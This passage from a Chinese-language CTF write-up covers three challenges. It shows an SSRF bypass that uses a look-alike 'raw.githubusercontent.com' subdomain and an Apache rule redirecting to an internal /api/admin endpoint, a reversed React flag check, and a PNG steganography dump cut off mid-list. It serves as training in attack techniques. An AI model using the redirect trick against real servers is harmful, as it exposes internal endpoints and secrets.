<li>將 <code>raw.githubusercontent.com.vicevirus.me</code> 解析到你自己的託管Web伺服器的IP位址上<ul>
<li>登入DNS管理介面：首先，登入你的DNS服務提供者的管理介面。這可能是你註冊網域的地方，或是你使用的專門的DNS管理服務提供者的網站</li>
<li>找到網域設定：在管理介面中找到你要設定的網域名稱（vicevirus.me）的設定選項。這通常可以在控制面板的「網域設定」、「DNS管理」或類似的選單下找到</li>
<li>新增A記錄：在網域設定中，找到「新增記錄」、「新增記錄」或類似的選項，並選擇A記錄類型。然後，填寫以下資訊：<ul>
<li>子網域（Subdomain）：在這裡填入 raw.githubusercontent.com.vicevirus.me</li>
<li>目標（Destination）：填寫你自己的託管Web伺服器的IP位址<ul>
<li>你自己的Web伺服器所在的IP位址。這個IP位址是你的伺服器在網路上的唯一標識，使用者透過造訪這個IP位址來造訪你的網站。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>具體操作可能會因你所使用的DNS服務提供者而異，通常在DNS管理控制面板的「新增記錄」或類似選項下進行設定</li>
</ul>
</li>
<li>創建TLD domain 的A紀錄 subdomain →  raw.githubusercontent.com.<strong>vicevirus.me</strong></li>
<li>將A紀錄指向自己託管的web server IP addr</li>
<li>託管一個帶有將重定向到內部 /api/admin 端點的端點的 Web 伺服器</li>
</ul>
<p>回顧到程式碼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@api.get(<span class="params"><span class="string">&quot;/admin&quot;</span>, response=&#123;<span class="number">200</span>: <span class="built_in">dict</span>, <span class="number">401</span>: Error&#125;</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    client_ip, is_routable = get_client_ip(request)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_routable :</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;msg&#x27;</span>:os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">401</span>, &#123;<span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ACCESS DENIED&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>/api/admin</code> 端點執行了一個權限驗證，透過 <code>get_client_ip(request)</code> 函數取得客戶端的IP位址並檢查是否可路由。如果客戶端的IP位址無法路由（即在內部網路），則傳回環境變數中的標誌（FLAG），否則傳回存取被拒絕的訊息</p>
<p><code>get_client_ip</code> 這個函數的目的是要取得客戶端的IP位址，並判斷這個IP位址是否可路由</p>
<p>這種可路由性通常用於識別是否是來自內部網路的請求，或者是否是來自外部網路的請求</p>
<p>可路由的IP位址通常意味著它們是可以透過Internet存取的IP位址，而不可路由的IP位址可能是區域網路或其他內部網路的位址</p>
<p><code>client_ip</code> 變數用來儲存客戶端的IP位址，而 <code>is_routable</code> 變數則用來表示這個IP位址是否可路由，如果是，則為 True，否則為 False</p>
<p>所以才需要託管一個帶有將重定向到內部<code>/api/admin</code> 端點的Web伺服器</p>
<p>使用Apache Web Server 在本地的伺服器上設置SSL(HTTPS) 在端點上執行重定向</p>
<p>先下載mod_ssl</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# a2enmod ssl</span><br><span class="line"></span><br><span class="line">Considering dependency mime <span class="keyword">for</span> ssl:</span><br><span class="line"><span class="keyword">Module</span> mime already enabled</span><br><span class="line">Considering dependency socache_shmcb <span class="keyword">for</span> ssl:</span><br><span class="line">Enabling <span class="keyword">module</span> socache_shmcb.</span><br><span class="line">Enabling <span class="keyword">module</span> ssl.</span><br><span class="line">See /usr/share/doc/apache2/README.Debian.gz <span class="keyword">on</span> how <span class="keyword">to</span> configure SSL <span class="built_in">and</span> create self-signed certificates.</span><br><span class="line"><span class="keyword">To</span> activate the <span class="built_in">new</span> configuration, you need <span class="keyword">to</span> run:</span><br><span class="line">  systemctl restart apache2</span><br><span class="line">                                                                                                                                                 </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# systemctl restart apache2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>進行以下apache文件設置  /etc/apache2/apache2.conf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_ssl.c&gt;</span><br><span class="line">&lt;VirtualHost *:443&gt;</span><br><span class="line"></span><br><span class="line">	RewriteEngine On</span><br><span class="line">	<span class="comment">#checks if the host and request uri = raw.githubusercontent.com.reciveto.me/main/README.md</span></span><br><span class="line"> 	RewriteCond %&#123;HTTP_HOST&#125; ^raw\\.githubusercontent\\.com\\.vicevirus\\.me$</span><br><span class="line"> 	RewriteCond %&#123;REQUEST_URI&#125; ^/main/README\\.md$</span><br><span class="line"> 	<span class="comment"># redirect to &lt;http://127.0.0.1:8044/api/admin&gt;, port 8044 is based on start.sh</span></span><br><span class="line"> 	RewriteRule ^(.*)$ &lt;http://127.0.0.1:8044/api/admin&gt; [R=302,L]</span><br><span class="line"></span><br><span class="line">	ServerAdmin webmaster@localhost</span><br><span class="line">	DocumentRoot /var/www/html</span><br><span class="line"></span><br><span class="line">	ErrorLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line">	CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"></span><br><span class="line">ServerName raw.githubusercontent.com.vicevirus.me</span><br><span class="line">SSLCertificateFile /etc/letsencrypt/live/raw.githubusercontent.com.vicevirus.me/fullchain.pem</span><br><span class="line">SSLCertificateKeyFile /etc/letsencrypt/live/raw.githubusercontent.com.vicevirus.me/privkey.pem</span><br><span class="line">Include /etc/letsencrypt/options-ssl-apache.conf</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>啟用SSL模組：在Apache的設定檔中啟用SSL模組，確保mod_ssl已載入：</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">LoadModule ssl_module modules/mod_ssl.so</span><br></pre></td></tr></table></figure>
<p>重啟Apache伺服器：儲存您的設定更改，並重新啟動Apache伺服器以使更改生效</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure>
<p>當造訪raw.githubusercontent.com.vicevirus.me時，請求將會重新導向至HTTPS，並透過SSL進行安全傳輸</p>
<p>所以總結來說就是 : 設置A紀錄 &gt; 配置重定向規則 &gt; 配置SSL證書 &gt; 加載web server</p>
<p>最後一步，將domain 傳遞給：<code>/api/view</code></p>
<p><img src="img/hackthonkor_17.png" alt="Untitled"></p>
<p>參考資料</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.namecheap.com/support/knowledgebase/article.aspx/9776/2237/how-to-create-a-subdomain-for-my-domain/">如何為我的域名創建子功能變數名稱 - 功能變數名稱 - Namecheap.com</a></li>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/63837013/can-i-have-sub-domain-tld-and-sub-domain-tld-resolve-to-different-places">url - 我可以將 sub.domain.tld 和 *.sub.domain.tld 解析為不同的位置嗎？- 堆疊溢出 (stackoverflow.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.namecheap.com/support/knowledgebase/article.aspx/9776/2237/how-to-create-a-subdomain-for-my-domain/">https://www.namecheap.com/support/knowledgebase/article.aspx/9776/2237/how-to-create-a-subdomain-for-my-domain/</a></li>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5257974/how-to-install-mod-ssl-for-apache-httpd">ssl - How to install mod_ssl for Apache httpd? - Stack Overflow</a></li>
<li><a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/current/mod/mod_ssl.html">mod_ssl - Apache HTTP Server 版本 2.4</a></li>
</ul>
<hr>
<h3 id="Revact"><a href="#Revact" class="headerlink" title="Revact"></a><strong>Revact</strong></h3><p><img src="img/hackthonkor_18.png" alt="Untitled"></p>
<p>這網站會檢查你輸入的內容，可以透過這js查看到網站的資訊</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://d1rov3aw0q2u2y.cloudfront.net/static/js/main.5e39c7c2.js</span><br></pre></td></tr></table></figure>
<p><img src="img/hackthonkor_19.png" alt="Untitled"></p>
<p>從js中可以看到一些程式片段也許是跟flag提示相關的</p>
<ul>
<li>endsWith &amp;&amp; startsWith 都是 ‘X’</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ce.displayName = <span class="string">&quot;Button&quot;</span>;</span><br><span class="line">        const Ee = Ce;</span><br><span class="line">        <span class="keyword">function</span> Ne(e) &#123;</span><br><span class="line">            const t = <span class="keyword">function</span>(e) &#123;</span><br><span class="line">                <span class="built_in">let</span> t = arguments.length &gt; 1 &amp;&amp; void 0 !== arguments[1] ? arguments[1] : <span class="string">&quot;w&quot;</span>;</span><br><span class="line">                e.ms(<span class="string">&quot;&quot;</span>.concat(t).concat(n(114)).concat(<span class="string">&quot;on&quot;</span>).concat(n(103)))</span><br><span class="line">            &#125;</span><br><span class="line">              , n = e=&gt;String.fromCharCode(e)</span><br><span class="line">              , r = <span class="keyword">function</span>(e, n) &#123;</span><br><span class="line">                <span class="built_in">let</span> r = arguments.length &gt; 2 &amp;&amp; void 0 !== arguments[2] ? arguments[2] : <span class="string">&quot;c&quot;</span>;</span><br><span class="line">                e.s(n) &amp;&amp; 7 === e.l ? e.ms(<span class="string">&quot;&quot;</span>.concat(r, <span class="string">&quot;or&quot;</span>).concat(<span class="string">&quot;re&quot;</span>, <span class="string">&quot;ct&quot;</span>)) : t(e)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="built_in">return</span> (0,</span><br><span class="line">            a.jsx)(Ee, &#123;</span><br><span class="line">                variant: <span class="string">&quot;primary&quot;</span>,</span><br><span class="line">                <span class="built_in">type</span>: <span class="string">&quot;button&quot;</span>,</span><br><span class="line">                onClick: n=&gt;&#123;</span><br><span class="line">                    n.target.form[0].value.endsWith(n.target.form[0].value[0]) &amp;&amp; e.c &amp;&amp; n.target.form[0].value.startsWith(<span class="string">&quot;X&quot;</span>) ? r(e, n.target.form[0].value) : t(e)</span><br><span class="line">                &#125;</span><br><span class="line">                ,</span><br><span class="line">                children: <span class="string">&quot;Check&quot;</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> _e(e) &#123;</span><br><span class="line">    <span class="built_in">return</span> (0,</span><br><span class="line">    a.jsx)(ke.Control, &#123;</span><br><span class="line">        <span class="built_in">type</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">        placeholder: <span class="string">&quot;FLAG&quot;</span>,</span><br><span class="line">        onChange: t=&gt;&#123;</span><br><span class="line">            0 === t.target.value.split(<span class="string">&quot;&quot;</span>).map((e=&gt;e.charCodeAt() &lt; <span class="number">33</span> ? &quot;a&quot; : &quot;&quot;)).map((e=&gt;e.charCodeAt() &gt; <span class="number">126</span> ? &quot;b&quot; : &quot;&quot;)).<span class="built_in">join</span>(<span class="string">&quot;&quot;</span>).length ? e.t(!0) : e.t(!1),</span><br><span class="line">            e.ls(t.target.value.length)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> Pe(t) &#123;</span><br><span class="line">    <span class="built_in">let</span>[n,r] = (0,</span><br><span class="line">    e.useState)(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">    <span class="built_in">return</span> (0,</span><br><span class="line">    a.jsxs)(ke, &#123;</span><br><span class="line">        children: [(0,</span><br><span class="line">        a.jsxs)(ke.Group, &#123;</span><br><span class="line">            className: <span class="string">&quot;mb-3&quot;</span>,</span><br><span class="line">            controlId: <span class="string">&quot;formFlag&quot;</span>,</span><br><span class="line">            children: [(0,</span><br><span class="line">            a.jsx)(ke.Label, &#123;</span><br><span class="line">                children: n</span><br><span class="line">            &#125;), (0,</span><br><span class="line">            a.jsx)(_e, &#123;</span><br><span class="line">                t: t.t,</span><br><span class="line">                <span class="built_in">ls</span>: t.ls</span><br><span class="line">            &#125;)]</span><br><span class="line">        &#125;), (0,</span><br><span class="line">        a.jsx)(Ne, &#123;</span><br><span class="line">            s: t.s,</span><br><span class="line">            l: t.l,</span><br><span class="line">            c: t.c,</span><br><span class="line">            ms: r</span><br><span class="line">        &#125;)]</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>e.split(&quot;&quot;)[4] === localStorage.getItem(&quot;z&quot;)</code> 這邊寫第四個字元是 <code>z</code>，但要注意到 <code>localStorage.setItem(&quot;z&quot;, &quot;D&quot;)</code> 轉換成了 <code>D</code> ，所以第四個字元是 <code>D</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">ze</span></span>() &#123;</span><br><span class="line">    <span class="built_in">let</span>[t,n] = (0,</span><br><span class="line">    e.useState)(0)</span><br><span class="line">      , [r,l] = (0,</span><br><span class="line">    e.useState)(!1);</span><br><span class="line">    <span class="built_in">return</span> (0,</span><br><span class="line">    ****e.useEffect)((()=&gt;&#123;</span><br><span class="line">        localStorage.setItem(&quot;z&quot;, &quot;D&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    ), []),</span><br><span class="line">    (<span class="number">0</span>,</span><br><span class="line">    a.jsx)(&quot;div&quot;, &#123;</span><br><span class="line">        className: &quot;align-middle h-<span class="number">100</span> p-<span class="number">5</span>&quot;,</span><br><span class="line">        children: (<span class="number">0</span>,</span><br><span class="line">        a.jsx)(D, &#123;</span><br><span class="line">            className: &quot;mt-<span class="number">5</span>&quot;,</span><br><span class="line">            children: (<span class="number">0</span>,</span><br><span class="line">            a.jsxs)(D.Body, &#123;</span><br><span class="line">                children: [(<span class="number">0</span>,</span><br><span class="line">                a.jsx)(D.Title, &#123;</span><br><span class="line">                    children: (<span class="number">0</span>,</span><br><span class="line">                    a.jsx)(&quot;p&quot;, &#123;</span><br><span class="line">                        children: &quot;Simple React App&quot;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;), (<span class="number">0</span>,</span><br><span class="line">                a.jsx)(Pe, &#123;</span><br><span class="line">                    s: e=&gt;e.split(&quot;&quot;)[<span class="number">5</span>].charCodeAt() - <span class="number">56</span> === e.split(&quot;&quot;)[<span class="number">1</span>].charCodeAt() - <span class="number">5</span> &amp;&amp; e.split(&quot;&quot;)[<span class="number">2</span>] === e.split(&quot;&quot;)[<span class="number">3</span>] &amp;&amp; &quot;@&quot; === e.split(&quot;&quot;)[<span class="number">2</span>] &amp;&amp; e.split(&quot;&quot;)[<span class="number">4</span>] === localStorage.getItem(&quot;z&quot;) &amp;&amp; e.split(&quot;&quot;)[<span class="number">5</span>].charCodeAt() === e.split(&quot;&quot;)[<span class="number">4</span>].charCodeAt() + <span class="number">54</span>,</span><br><span class="line">                    c: r,</span><br><span class="line">                    t: l,</span><br><span class="line">                    ls: n,</span><br><span class="line">                    l: t</span><br><span class="line">                &#125;)]</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到這邊的檢查機制</p>
<ul>
<li>2、3字元是 <code>@@</code></li>
<li>第5個字元是 <code>z</code>  (它沒有localStorage.getItem影響成 <code>D</code>)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">s: e=&gt;e.split(<span class="string">&quot;&quot;</span>)[5].charCodeAt() - 56 === e.split(<span class="string">&quot;&quot;</span>)[1].charCodeAt() - 5 &amp;&amp;</span><br><span class="line">      e.split(<span class="string">&quot;&quot;</span>)[2] === e.split(<span class="string">&quot;&quot;</span>)[3] &amp;&amp; </span><br><span class="line">      <span class="string">&quot;@&quot;</span> === e.split(<span class="string">&quot;&quot;</span>)[2] &amp;&amp; </span><br><span class="line">      e.split(<span class="string">&quot;&quot;</span>)[4] === localStorage.getItem(<span class="string">&quot;z&quot;</span>) &amp;&amp; </span><br><span class="line">      e.split(<span class="string">&quot;&quot;</span>)[5].charCodeAt() === e.split(<span class="string">&quot;&quot;</span>)[4].charCodeAt() + 54,</span><br></pre></td></tr></table></figure>
<p>統整一下包含前後兩個X包夾，中間有5個字元</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. X</span><br><span class="line">---</span><br><span class="line">1.</span><br><span class="line">2. @</span><br><span class="line">3. @</span><br><span class="line">4. D</span><br><span class="line">5. z</span><br><span class="line">----</span><br><span class="line">7. X</span><br></pre></td></tr></table></figure>
<p>第2個判斷條件是檢查第 5 個字元的 ASCII 碼減去 56 是否等於第 1 個字元的 ASCII 碼減去 5 ⇒ true</p>
<ul>
<li>z ⇒ 122 - 56 ⇒ 66</li>
<li>[1] - 5 ⇒ 66</li>
<li>[1] ⇒ 71 ⇒ G</li>
</ul>
<p><img src="img/hackthonkor_20.png" alt="Untitled"></p>
<ul>
<li>ANS : <code>XG@@DzX</code></li>
</ul>
<p><img src="img/hackthonkor_21.png" alt="Untitled"></p>
<hr>
<h3 id="PNGRST"><a href="#PNGRST" class="headerlink" title="PNGRST"></a>PNGRST</h3><p>這題在比賽結束後兩小時，隊友才解出來，原本以為是要取那些座標區域去把那些區域的圖片才切下來，結果證實我的想法不對呵呵</p>
<p>還是要靠forensic大大來拯救</p>
<p>順便推薦一個線上的forensic工具，雖然在這題沒啥幫助但還是紀錄一下</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://29a.ch/photo-forensics/#forensic-magnifier">https://29a.ch/photo-forensics/#forensic-magnifier</a></li>
</ul>
<p>這題給了一張圖片</p>
<p><img src="img/hackthonkor_22.png" alt="Untitled"></p>
<p>感謝隊友的提示</p>
<p><img src="img/hackthonkor_23.png" alt="Untitled"></p>
<p>這題用zsteg可以看到一些座標位置，但這看起來並不完整</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/upload_file_web]</span><br><span class="line">└─# zsteg present.png </span><br><span class="line">[?] 11 bytes of extra data after image end (IEND), offset = 0x1822b4</span><br><span class="line">extradata:0         .. text: <span class="string">&quot;(X,Y) (2,5)&quot;</span></span><br><span class="line">imagedata           .. text: <span class="string">&quot;(((101999\&quot;\&quot;\&quot;&quot;</span></span><br><span class="line">b1,g,lsb,xy         .. text: <span class="string">&quot;(8,5), (8,6), (8,7), (8,8), (8,9), (8,10), (8,11), (8,12), (8,93), (8,94), (8,95), (8,96), (8,97), (8,98), (8,99), (8,100), (8,157), (8,158), (8,159), (8,160), (8,161), (8,162), (8,163), (8,164), (8,165), (8,166), (8,167), (8,168), (8,169), (8,170), (8,171&quot;</span></span><br><span class="line">b1,rgb,lsb,xy       .. file: Commodore PET BASIC program, offset 0x0100, line 36, token (0x1)</span><br><span class="line">b1,rgb,msb,xy       .. file: tar archive (old), <span class="built_in">type</span> <span class="string">&#x27;\200&#x27;</span> \200 , mode  \001\2, uid \200$, gid @\200\0, size  \001\200, seconds  \001\200\0, linkname $, comment: \001</span><br><span class="line">b2,b,lsb,xy         .. text: [<span class="string">&quot;U&quot;</span> repeated 8 <span class="built_in">times</span>]</span><br><span class="line">b4,g,msb,xy         .. file: Applesoft BASIC program data, first line number 8</span><br><span class="line">b4,rgb,lsb,xy       .. file: Adobe Photoshop Color swatch, version 0, 1 colors; 1st RGB space (0), w 0x100, x 0, y 0, z 0</span><br><span class="line">b4,rgb,msb,xy       .. file: Adobe Photoshop Color swatch, version 0, 128 colors; 1st RGB space (0), w 0x8000, x 0, y 0, z 0; 2nd space (128), w 0x8, x 0x8000, y 0, z 0 </span><br></pre></td></tr></table></figure>
<p>所以將該字段的全部內容導出到txt中查看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/upload_file_web]</span><br><span class="line">└─# zsteg -E <span class="string">&quot;b1,g,lsb,xy&quot;</span> present.png  &gt; pre.txt</span><br><span class="line"></span><br><span class="line">(8,5), (8,6), (8,7), (8,8), (8,9), (8,10), (8,11), (8,12), (8,93), (8,94), (8,95), (8,96), (8,97), (8,98), (8,99), (8,100), (8,157), (8,158), (8,159), (8,160), (8,161), (8,162), (8,163), (8,164), (8,165), (8,166), (8,167), (8,168), (8,169), (8,170), (8,171), (8,172), (8,173), (8,174), (8,175), (8,176), (8,177), (8,178), (8,179), (8,180), (8,181), (8,182), (8,183), (8,184), (8,185), (8,186), (8,187), (8,188), (8,213), (8,214), (8,215), (8,216), (8,217), (8,218), (8,219), (8,220), (8,221), (8,222), (8,223), (8,224), (8,225), (8,226), (8,227), (8,228), (8,269), (8,270), (8,271), (8,272), (8,273), (8,274), (8,275), (8,276), (8,293), (8,294), (8,295), (8,296), (8,297), (8,298), (8,299), (8,300), (8,301), (8,302), (8,303), (8,304), (8,305), (8,306), (8,307), (8,308), (8,309), (8,310), (8,311), (8,312), (8,313), (8,314), (8,315), (8,316), (8,317), (8,318), (8,319), (8,320), (8,321), (8,322), (8,323), (8,324), (8,325), (8,326), (8,327), (8,328), (8,329), (8,330), (8,331), (8,332), (8,397), (8,398), (8,399), (8,400), (8,401), (8,402), (8,403), (8,404), (8,405), (8,406), (8,407), (8,408), (8,409), (8,410), (8,411), (8,412), (8,437), (8,438), (8,439), (8,440), (8,441), (8,442), (8,443), (8,444), (8,445), (8,446), (8,447), (8,448), (8,449), (8,450), (8,451), (8,452), (8,461), (8,462), (8,463), (8,464), (8,465), (8,466), (8,467), (8,468), (8,501), (8,502), (8,503), (8,504), (8,505), (8,506), (8,507), (8,508), (9,5), (9,6), (9,7), (9,8), (9,9), (9,10), (9,11), (9,12), (9,93), (9,94), (9,95), (9,96), (9,97), (9,98), (9,99), (9,100), (9,157), (9,158), (9,159), (9,160), (9,161), (9,162), (9,163), (9,164), (9,165), (9,166), (9,167), (9,168), (9,169), (9,170), (9,171), (9,172), (9,173), (9,174), (9,175), (9,176), (9,177), (9,178), (9,179), (9,180), (9,181), (9,182), (9,183), (9,184), (9,185), (9,186), (9,187), (9,188), (9,213), (9,214), (9,215), (9,216), (9,217), (9,218), (9,219), (9,220), (9,221), (9,222), (9,223), (9,224), (9,225), (9,226), (9,227), (9,228), (9,269), (9,270), (9,271), (9,272), (9,273), (9,274), (9,275), (9,276), (9,293), (9,294), (9,295), (9,296), (9,297), (9,298), (9,299), (9,300), (9,301), (9,302), (9,303), (9,304), (9,305), (9,306), (9,307), (9,308), (9,309), (9,310), (9,311), (9,312), (9,313), (9,314), (9,315), (9,316), (9,317), (9,318), (9,319), (9,320), (9,321), (9,322), (9,323), (9,324), (9,325), (9,326), (9,327), (9,328), (9,329), (9,330), (9,331), (9,332), (9,397), (9,398), (9,399), (9,400), (9,401), (9,402), (9,403), (9,404), (9,405), (9,406), (9,407), (9,408), (9,409), (9,410), (9,411), (9,412), (9,437), (9,438), (9,439), (9,440), (9,441), (9,442), (9,443), (9,444), (9,445), (9,446), (9,447), (9,448), (9,449), (9,450), (9,451), (9,452), (9,461), (9,462), (9,463), (9,464), (9,465), (9,466), (9,467), (9,468), (9,501), (9,502), (9,503), (9,504), (9,505), (9,506), (9,507), (9,508), (10,5), (10,6), (10,7), (10,8), (10,9), (10,10), (10,11), (10,12), (10,93), (10,94), (10,95), (10,96), (10,97), (10,98), (10,99), (10,100), (10,157), (10,158), (10,159), (10,160), (10,161), (10,162), (10,163), (10,164), (10,165), (10,166), (10,167), (10,168), (10,169), (10,170), (10,171), (10,172), (10,173), (10,174), (10,175), (10,176), (10,177), (10,178), (10,179), (10,180), (10,181), (10,182), (10,183), (10,184), (10,185), (10,186), (10,187), (10,188), (10,213), (10,214), (10,215), (10,216), (10,217), (10,218), (10,219), (10,220), (10,221), (10,222), (10,223), (10,224), (10,225), (10,226), (10,227), (10,228), (10,269), (10,270), (10,271), (10,272), (10,273), (10,274), (10,275), (10,276), (10,293), (10,294), (10,295), (10,296), (10,297), (10,298), (10,299), (10,300), (10,301), (10,302), (10,303), (10,304), (10,305), (10,306), (10,307), (10,308), (10,309), (10,310), (10,311), (10,312), (10,313), (10,314), (10,315), (10,316), (10,317), (10,318), (10,319), (10,320), (10,321), (10,322), (10,323), (10,324), (10,325), (10,326), (10,327), (10,328), (10,329), (10,330), (10,331), (10,332), (10,397), (10,398), (10,399), (10,400), (10,401), (10,402), (10,403), (10,404), (10,405), (10,406), (10,407), (10,408), (10,409), (10,410), (10,411), (10,412), (10,437), (10,438), (10,439), (10,440), (10,441), (10,442), (10,443), (10,444), (10,445), (10,446), (10,447), (10,448), (10,449), (10,450), (10,451), (10,452), (10,461), (10,462), (10,463), (10,464), (10,465), (10,466), (10,467), (10,468), (10,501), (10,502), (10,503), (10,504), (10,505), (10,506), (10,507), (10,508), (11,5), (11,6), (11,7), (11,8), (11,9), (11,10), (11,11), (11,12), (11,93), (11,94), (11,95), (11,96), (11,97), (11,98), (11,99), (11,100), (11,157), (11,158), (11,159), (11,160), (11,161), (11,162), (11,163), (11,164), (11,165), (11,166), (11,167), (11,168), (11,169), (11,170), (11,171), (11,172), (11,173), (11,174), (11,175), (11,176), (11,177), (11,178), (11,179), (11,180), (11,181), (11,182), (11,183), (11,184), (11,185), (11,186), (11,187), (11,188), (11,213), (11,214), (11,215), (11,216), (11,217), (11,218), (11,219), (11,220), (11,221), (11,222), (11,223), (11,224), (11,225), (11,226), (11,227), (11,228), (11,269), (11,270), (11,271), (11,272), (11,273), (11,274), (11,275), (11,276), (11,293), (11,294), (11,295), (11,296), (11,297), (11,298), (11,299), (11,300), (11,301), (11,302), (11,303), (11,304), (11,305), (11,306), (11,307), (11,308), (11,309), (11,310), (11,311), (11,312), (11,313), (11,314), (11,315), (11,316), (11,317), (11,318), (11,319), (11,320), (11,321), (11,322), (11,323), (11,324), (11,325), (11,326), (11,327), (11,328), (11,329), (11,330), (11,331), (11,332), (11,397), (11,398), (11,399), (11,400), (11,401), (11,402), (11,403), (11,404), (11,405), (11,406), (11,407), (11,408), (11,409), (11,410), (11,411), (11,412), (11,437), (11,438), (11,439), (11,440), (11,441), (11,442), (11,443), (11,444), (11,445), (11,446), (11,447), (11,448), (11,449), (11,450), (11,451), (11,452), (11,461), (11,462), (11,463), (11,464), (11,465), (11,466), (11,467), (11,468), (11,501), (11,502), (11,503), (11,504), (11,505), (11,506), (11,507), (11,508), (12,5), (12,6), (12,7), (12,8), (12,9), (12,10), (12,11), (12,12), (12,93), (12,94), (12,95), (12,96), (12,97), (12,98), (12,99), (12,100), (12,157), (12,158), (12,159), (12,160), (12,161), (12,162), (12,163), (12,164), (12,165), (12,166), (12,167), (12,168), (12,169), (12,170), (12,171), (12,172), (12,173), (12,174), (12,175), (12,176), (12,177), (12,178), (12,179), (12,180), (12,181), (12,182), (12,183), (12,184), (12,185), (12,186), (12,187), (12,188), (12,213), (12,214), (12,215), (12,216), (12,217), (12,218), (12,219), (12,220), (12,221), (12,222), (12,223), (12,224), (12,225), (12,226), (12,227), (12,228), (12,269), (12,270), (12,271), (12,272), (12,273), (12,274), (12,275), (12,276), (12,293), (12,294), (12,295), (12,296), (12,297), (12,298), (12,299), (12,300), (12,301), (12,302), (12,303), (12,304), (12,305), (12,306), (12,307), (12,308), (12,309), (12,310), (12,311), (12,312), (12,313), (12,314), (12,315), (12,316), (12,317), (12,318), (12,319), (12,320), (12,321), (12,322), (12,323), (12,324), (12,325), (12,326), (12,327), (12,328), (12,329), (12,330), (12,331), (12,332), (12,397), (12,398), (12,399), (12,400), (12,401), (12,402), (12,403), (12,404), (12,405), (12,406), (12,407), (12,408), (12,409), (12,410), (12,411), (12,412), (12,437), (12,438), (12,439), (12,440), (12,441), (12,442), (12,443), (12,444), (12,445), (12,446), (12,447), (12,448), (12,449), (12,450), (12,451), (12,452), (12,461), (12,462), (12,463), (12,464), (12,465), (12,466), (12,467), (12,468), (12,501), (12,502), (12,503), (12,504), (12,505), (12,506), (12,507), (12,508), (13,5), (13,6), (13,7), (13,8), (13,9), (13,10), (13,11), (13,12), (13,93), (13,94), (13,95), (13,96), (13,97), (13,98), (13,99), (13,100), (13,157), (13,158), (13,159), (13,160), (13,161), (13,162), (13,163), (13,164), (13,165), (13,166), (13,167), (13,168), (13,169), (13,170), (13,171), (13,172), (13,173), (13,174), (13,175), (13,176), (13,177), (13,178), (13,179), (13,180), (13,181), (13,182), (13,183), (13,184), (13,185), (13,186), (13,187), (13,188), (13,213), (13,214), (13,215), (13,216), (13,217), (13,218), (13,219), (13,220), (13,221), (13,222), (13,223), (13,224), (13,225), (13,226), (13,227), (13,228), (13,269), (13,270), (13,271), (13,272), (13,273), (13,274), (13,275), (13,276), (13,293), (13,294), (13,295), (13,296), (13,297), (13,298), (13,299), (13,300), (13,301), (13,302), (13,303), (13,304), (13,305), (13,306), (13,307), (13,308), (13,309), (13,310), (13,311), (13,312), (13,313), (13,314), (13,315), (13,316), (13,317), (13,318), (13,319), (13,320), (13,321), (13,322), (13,323), (13,324), (13,325), (13,326), (13,327), (13,328), (13,329), (13,330), (13,331), (13,332), (13,397), (13,398), (13,399), (13,400), (13,401), (13,402), (13,403), (13,404), (13,405), (13,406), (13,407), (13,408), (13,409), (13,410), (13,411), (13,412), (13,437), (13,438), (13,439), (13,440), (13,441), (13,442), (13,443), (13,444), (13,445), (13,446), (13,447), (13,448), (13,449), (13,450), (13,451), (13,452), (13,461), (13,462), (13,463), (13,464), (13,465), (13,466), (13,467), (13,468), (13,501), 